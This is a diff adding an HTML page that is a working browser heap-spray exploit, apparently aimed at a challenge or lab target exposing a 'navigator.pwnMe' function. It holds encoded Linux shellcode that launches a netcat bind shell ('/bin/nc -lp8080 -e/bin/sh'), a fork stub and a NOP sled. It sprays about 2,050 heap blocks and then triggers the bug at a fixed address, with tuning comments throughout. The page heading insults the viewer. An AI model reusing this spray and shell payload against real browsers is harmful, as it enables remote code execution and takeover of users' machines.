@@ -1,0 +1,58 @@
+<html>
+<head>
+<script>
+    var shellcode = unescape("%u2aeb%u315e%u88c0%u0746%u4688%u880f%u1946%u7689%u8d1a%u085e%u5e89%u8d1e%u105e%u5e89%u8922%u2646%u0bb0%uf389%u4e8d%u8d1a%u2656%u80cd%ud1e8%uffff%u2fff%u6962%u2f6e%u636e%u2d23%u706c%u3038%u3038%u2d23%u2f65%u6962%u2f6e%u6873%uee23");
+//    var shellcode = unescape("%uc390");
+//    var forkMe = unescape("%u02b8%u0000%ucd00%u8580%u74c0%uc301"); 
+    var forkMe = unescape("%u3190%ub0c0%ucd02%u8580%u74c0%uc301"); 
+    var oneblock = unescape("%u9090%u9090");
+    window.onload = function() {
+    document.getElementById('blockLength').innerHTML = 'One block length: ' + oneblock.length;
+    document.getElementById('shellLength').innerHTML = 'Shellcode length: ' + shellcode.length;
+    document.getElementById('fullLength').innerHTML = 'Fulllength length: ' + fullBlock.length;
+    document.getElementById('spray').innerHTML = 'One spray length: ' +   sprayContainer[0].length;
+    document.getElementById('shellcode').innerHTML = 'Shellcode: ' +   escape(shellcode);
+    document.getElementById('oneblock').innerHTML = 'One block length: ' +   escape(oneblock);
+    }
+
+    var fullBlock = oneblock;
+    while(fullBlock.length < 0x10000) {
+      fullBlock+=oneblock;
+    }
+//93300000-b0300000
+// Runs OOM at 5000.
+// Find more suitable value.
+
+// breakpoint 0xa2083ff0
+// Also test and analysize the heap in different scenarios.
+
+
+// Fresh start works at 4000. Refreshing would kill the process due to OOM.
+// Multiple refreshes(8) work at 3250. Do we need more? Change this after analysing in different situations.
+
+    sprayContainer = new Array();
+    for (i = 0; i < 2050; i++) {
+      sprayContainer[i] = fullBlock + forkMe +shellcode;
+    }
+
+
+    var sales = <sales vendor="John">
+    <item type="peas" price="4" quantity="6"/>
+    <item type="carrot" price="3" quantity="10"/>
+    <item type="chips" price="5" quantity="3"/>
+    </sales>;
+    
+     navigator.pwnMe("0x9c201000");
+</script>
+</head> 
+<body>
+        <h1>Fuck you, you noob shit. Hah</h1>
+
+        <div id="blockLength"></div>
+        <div id="shellLength"></div>
+        <div id="fullLength"></div>
+        <div id="spray"></div>
+        <div id="shellcode"></div>
+        <div id="oneblock"></div>
+</body>
+</html>
